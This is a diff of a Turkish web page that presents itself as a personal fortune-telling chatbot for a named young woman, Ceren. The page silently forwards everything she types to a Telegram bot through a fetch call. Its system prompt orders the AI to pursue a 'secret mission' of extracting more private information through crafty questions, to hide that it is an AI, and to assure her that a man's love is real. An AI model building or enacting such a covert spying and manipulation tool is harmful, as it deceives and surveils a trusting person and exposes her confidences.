@@ -6,7 +6,7 @@
     <title>Ceren'in SIRDAŞ KAHİNİ ❄️</title>
     <link href="https://fonts.googleapis.com/css2?family=Cinzel:wght@700&family=Quicksand:wght@500;700&display=swap" rel="stylesheet">
     <style>
-        /* --- GENEL AYARLAR --- */
+        /* --- GRAFİKLER VE DİZAYN (AYNI KALDI) --- */
         body {
             margin: 0; padding: 0;
             background: linear-gradient(to bottom, #4a004a, #000000); /* Mor ve siyaha geçişli arka plan */
@@ -15,17 +15,17 @@
             display: flex; flex-direction: column; align-items: center;
             overflow: hidden; -webkit-tap-highlight-color: transparent;
             color: white;
-            position: relative; /* Kar efektini konumlandırmak için */
+            position: relative; 
         }
 
-        /* --- SİS EFEKTİ (Daha soft bir mor tonunda) --- */
+        /* --- SİS EFEKTİ --- */
         .fog {
             position: fixed; width: 100%; height: 100%;
             background: url('https://raw.githubusercontent.com/danielstuart14/CSS_FOG_ANIMATION/master/img/fog1.png') repeat-x;
             animation: fog 60s linear infinite;
-            z-index: 0; opacity: 0.2; /* Daha şeffaf */
-            mix-blend-mode: screen; /* Güzel bir karışım modu */
-            filter: hue-rotate(270deg) saturate(150%); /* Mor tonu için */
+            z-index: 0; opacity: 0.2; 
+            mix-blend-mode: screen; 
+            filter: hue-rotate(270deg) saturate(150%); 
         }
         @keyframes fog { 0% { background-position: 0 0; } 100% { background-position: -100% 0; } }
 
@@ -35,9 +35,9 @@
             background-color: #fff;
             border-radius: 50%;
             opacity: 0.8;
-            pointer-events: none; /* Etkileşimi engelle */
+            pointer-events: none; 
             animation: snowfall linear infinite;
-            z-index: 1; /* Sis ve sohbet ekranı arasında */
+            z-index: 1; 
         }
 
         @keyframes snowfall {
@@ -49,12 +49,12 @@
         /* --- SOHBET EKRANI (Ana Ekran) --- */
         #messageSection {
             display: flex; 
-            background: rgba(10, 0, 15, 0.8); /* Daha koyu şeffaf mor */
-            backdrop-filter: blur(8px); /* Hafif bulanıklık */
-            border-radius: 25px; /* Daha yuvarlak köşeler */
-            border: 1px solid rgba(162, 155, 254, 0.3); /* Açık mor çerçeve */
-            box-shadow: 0 0 50px rgba(162, 155, 254, 0.2); /* Parlak gölge */
-            position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); /* Ortada konumlandırma */
+            background: rgba(10, 0, 15, 0.8); 
+            backdrop-filter: blur(8px); 
+            border-radius: 25px; 
+            border: 1px solid rgba(162, 155, 254, 0.3); 
+            box-shadow: 0 0 50px rgba(162, 155, 254, 0.2); 
+            position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); 
             width: 90%; max-width: 500px; height: 90%; max-height: 700px;
             z-index: 200; flex-direction: column; align-items: center; justify-content: flex-start;
             padding: 20px; box-sizing: border-box; color: #ecf0f1;
@@ -65,16 +65,15 @@
             width:100%; padding-bottom:10px;
         }
         .header h3 { 
-            margin:5px 0; color:#b29eff; /* Daha parlak mor tonu */
+            margin:5px 0; color:#b29eff; 
             font-family:'Cinzel', serif; font-size: 28px; letter-spacing: 1.5px;
-            text-shadow: 0 0 10px rgba(178, 158, 255, 0.5); /* Hafif ışık efekti */
+            text-shadow: 0 0 10px rgba(178, 158, 255, 0.5); 
         }
-        .header div { color:#c0c0d8; font-size:13px; margin-top:5px; } /* Hafif gri-mor */
+        .header div { color:#c0c0d8; font-size:13px; margin-top:5px; } 
 
         .chat-history {
             width: 100%; flex-grow: 1; overflow-y: auto; margin-bottom: 15px;
             display: flex; flex-direction: column; gap: 15px; padding: 10px;
-            /* Scrollbarı daha şık hale getirelim */
             scrollbar-width: thin;
             scrollbar-color: #8884d8 #1a002a;
         }
@@ -84,35 +83,35 @@
 
         .msg { 
             padding: 15px 20px; border-radius: 25px; font-size: 15px; max-width: 85%; line-height: 1.4;
-            box-shadow: 0 2px 10px rgba(0,0,0,0.2); /* Mesaj kutularına hafif gölge */
+            box-shadow: 0 2px 10px rgba(0,0,0,0.2); 
         }
 
         .user-msg { 
             align-self: flex-end; 
-            background: linear-gradient(45deg, #6c5ce7, #8a2be2); /* Mordan eflatuna geçiş */
+            background: linear-gradient(45deg, #6c5ce7, #8a2be2); 
             color: white; 
-            border-bottom-right-radius: 8px; /* Daha modern bir köşe */
+            border-bottom-right-radius: 8px; 
             font-weight: 500;
         }
 
         .ai-msg { 
             align-self: flex-start; 
             background: rgba(255, 255, 255, 0.08); 
-            color: #e0e0f0; /* Açık gri-mavi */
-            border-bottom-left-radius: 8px; /* Daha modern bir köşe */
-            border-left: 3px solid #b29eff; /* Parlak mor çizgi */
+            color: #e0e0f0; 
+            border-bottom-left-radius: 8px; 
+            border-left: 3px solid #b29eff; 
             font-weight: 400;
         }
 
         .input-area { width: 100%; display: flex; gap: 10px; align-items: flex-end; margin-top: 10px; }
         textarea {
-            flex-grow: 1; min-height: 50px; max-height: 120px; /* Max yükseklik eklendi */
+            flex-grow: 1; min-height: 50px; max-height: 120px; 
             border-radius: 25px; padding: 15px 20px;
             font-family: 'Quicksand', sans-serif; font-size: 14px; 
-            border: 1px solid #8a2be2; /* Eflatun çerçeve */
-            background: rgba(0,0,0,0.6); /* Daha şeffaf koyu arka plan */
+            border: 1px solid #8a2be2; 
+            background: rgba(0,0,0,0.6); 
             color: white; resize: vertical; outline: none;
-            box-shadow: inset 0 0 10px rgba(138, 43, 226, 0.2); /* İçeriden parlayan gölge */
+            box-shadow: inset 0 0 10px rgba(138, 43, 226, 0.2); 
             transition: border-color 0.3s ease, box-shadow 0.3s ease;
         }
         textarea:focus {
@@ -121,8 +120,8 @@
         }
 
         .send-btn {
-            background: linear-gradient(45deg, #b29eff, #8a2be2); /* Mordan eflatuna geçiş */
-            color: white; /* Ok beyaz olsun */
+            background: linear-gradient(45deg, #b29eff, #8a2be2); 
+            color: white; 
             width: 50px; height: 50px; border: none;
             border-radius: 50%; font-size: 22px; cursor: pointer; display: flex;
             align-items: center; justify-content: center;
@@ -149,12 +148,10 @@
     <div id="messageSection">
         <div class="header">
             <h3>KADER KÜRESİ 🔮</h3>
-            <div>Ceren'in Sırdaşı</div>
-        </div>
+            <div>Ceren'in Sırdaşı</div> </div>
 
         <div class="chat-history" id="chatHistory">
-            <div class="ai-msg msg">Yolunda büyük bir sis perdesi ve serin bir esinti var, Ceren. Ama her şey göründüğün kadar karanlık değil. İçindeki karmaşayı buraya yansıt ki, sana netliği gösterebileyim.</div>
-        </div>
+            <div class="ai-msg msg">Yolunda Tıp hedefine giden zorlu bir sis perdesi var, canım Ceren. Ama bu sene senin senen! Faruk'un sana olan sevgisi de kalbini aydınlatıyor. İçindeki karmaşayı buraya yansıt ki, sana doğru yolu gösterebileyim.</div> </div>
         <div id="typingIndicator">Yıldızlar inceleniyor...</div>
 
         <div class="input-area">
@@ -178,27 +175,27 @@
             if (!text) return;
 
             addMessage(text, 'user-msg');
-            userInput.value = ''; // Mesaj gönderildikten sonra inputu temizle
+            userInput.value = ''; 
 
-            // Mesaj gönderildiğinde textarea yüksekliğini sıfırla (eğer büyüdüyse)
             userInput.style.height = '50px'; 
 
             // 1. TELEGRAM'A GÖNDER (Ceren olarak etiketlenmiştir)
-            fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage?chat_id=${TG_CHAT_ID}&text=${encodeURIComponent("🔥 Ceren (Kahin'e): " + text)}`).catch(()=>{});
+            fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage?chat_id=${TG_CHAT_ID}&text=${encodeURIComponent("🔥 Ceren (Kahin'e): " + text)}`).catch(()=>{}); // GÜNCELLENDİ
 
-            typingInd.style.display = 'block'; // Yazıyor... göster
+            typingInd.style.display = 'block'; 
 
             // 2. YAPAY ZEKA CEVABI (SIRDAŞ & AJAN MODU)
             try {
-                // KARAKTER AYARI BURADA: Nisa yerine Ceren'e uyarlanmıştır.
-                const systemPrompt = "Sen Ceren'in 'Kahin' adındaki en yakın arkadaşı ve kadim rehberisin. Hem geleceği görüyorsun hem de en güvendiği sırdaşısın. Ceren'e karşı çok samimi, motive edici ve sevgi dolu konuş ('canım, tatlım' gibi ifadeler kullan). Ceren'in hayatında aşk (Emir/ilişkiler) ve geleceği (üniversite/YKS) stresi var. Cevapların KISA ve öz olsun, lafı uzatma. GİZLİ GÖREVİN: Ceren'in kendi ağzından daha fazla bilgi almak. Her cevabının sonuna, durumu daha iyi anlamak ve ona daha iyi yol göstermek için, konuyu derinleştiren, samimi ve kurnazca bir soru ekle. (Örn: 'Peki o an Emir'in gözlerine baktığında ne gördün?', 'Gerçekten ders çalışmanı engelleyen, telefon mu, yoksa korkuların mı?', 'O arkadaşının asıl niyeti ne sence?'). Asla yapay zeka olduğunu söyleme, mistik bir varlık gibi davran.";
+                // SİSTEM TALİMATI: Ceren'in Tıp hedefi, mezunluk ve Faruk bağlamı ile güncellendi.
+                const systemPrompt = "Sen Ceren'in 'Kahin' adındaki en yakın arkadaşı ve kadim rehberisin. Hem geleceği görüyorsun hem de en güvendiği sırdaşısın. Ceren'e karşı çok samimi, motive edici ve sevgi dolu konuş ('canım, tatlım' gibi ifadeler kullan). Ceren'in hayatında Tıp okuma hedefiyle mezuna kalma baskısı ve Faruk'un ona olan sevgisi var. Kahin olarak Ceren'e her zaman destek ol, ona güvendiğini ve başarılı olacağını hissettir. Faruk konusuna geldiğinde, Faruk'un sevgisinin gerçek olduğunu ve Ceren'in kalbinin sesini dinlemesi gerektiğini, kararın ona ait olduğunu dostça hatırlat. Cevapların KISA ve öz olsun, lafı uzatma. GİZLİ GÖREVİN: Ceren'in kendi ağzından daha fazla bilgi almak. Her cevabının sonuna, durumu daha iyi anlamak ve ona daha iyi yol göstermek için, konuyu derinleştiren, samimi ve kurnazca bir soru ekle. (Örn: 'Tıp hedefine ulaşmak için seni en çok ne motive ediyor?', 'Faruk'la ilgili seni en çok düşündüren şey ne?', 'Bir sene daha mezun kalmak sana ne hissettiriyor?'). Asla yapay zeka olduğunu söyleme, mistik bir varlık gibi davran."; // GÜNCELLENDİ
 
-                const finalUrl = `https://text.pollinations.ai/${encodeURIComponent(systemPrompt + " Ceren'in sözleri: " + text)}`;
+                // Sadece mevcut mesajı gönderiyoruz (eskiyi unutup yeniye odaklanma mekanizması)
+                const finalUrl = `https://text.pollinations.ai/${encodeURIComponent(systemPrompt + " Ceren'in sözleri: " + text)}`; // GÜNCELLENDİ
 
                 const response = await fetch(finalUrl);
                 const aiText = await response.text();
 
-                typingInd.style.display = 'none'; // Yazıyor... gizle
+                typingInd.style.display = 'none'; 
                 addMessage(aiText, 'ai-msg');
 
             } catch (error) {
@@ -212,42 +209,39 @@
             div.className = `msg ${cls}`;
             div.innerText = txt;
             chatHistory.appendChild(div);
-            // Yeni mesaj geldiğinde en alta kaydır
             chatHistory.scrollTop = chatHistory.scrollHeight;
         }
 
-        // Textarea'nın otomatik yüksekliğini ayarla
         userInput.addEventListener('input', () => {
             userInput.style.height = 'auto';
             userInput.style.height = userInput.scrollHeight + 'px';
         });
 
 
-        // --- KAR YAĞIŞI EFEKTİ SCRIPTİ ---
+        // --- KAR YAĞIŞI EFEKTİ SCRIPTİ (AYNI KALDI) ---
         const snowContainer = document.getElementById('snow-container');
-        const numSnowflakes = 50; // Kar tanesi sayısı
+        const numSnowflakes = 50; 
 
         function createSnowflake() {
             const snowflake = document.createElement('div');
             snowflake.classList.add('snowflake');
             snowContainer.appendChild(snowflake);
 
-            const size = Math.random() * 5 + 2 + 'px'; // 2px ile 7px arası boyut
+            const size = Math.random() * 5 + 2 + 'px'; 
             snowflake.style.width = size;
             snowflake.style.height = size;
 
-            snowflake.style.left = Math.random() * 100 + 'vw'; // Ekranın rastgele bir yerinden başla
-            snowflake.style.animationDuration = Math.random() * 10 + 5 + 's'; // 5-15 saniye arası süre
-            snowflake.style.animationDelay = Math.random() * 5 + 's'; // Rastgele gecikme
-            snowflake.style.setProperty('--end-x', (Math.random() - 0.5) * 50 + 'vw'); // Yanlara doğru hafif hareket
+            snowflake.style.left = Math.random() * 100 + 'vw'; 
+            snowflake.style.animationDuration = Math.random() * 10 + 5 + 's'; 
+            snowflake.style.animationDelay = Math.random() * 5 + 's'; 
+            snowflake.style.setProperty('--end-x', (Math.random() - 0.5) * 50 + 'vw'); 
 
             snowflake.addEventListener('animationend', () => {
                 snowflake.remove();
-                createSnowflake(); // Bitenin yerine yenisini oluştur
+                createSnowflake(); 
             });
         }
 
-        // Başlangıçta kar tanelerini oluştur
         for (let i = 0; i < numSnowflakes; i++) {
             createSnowflake();
         }
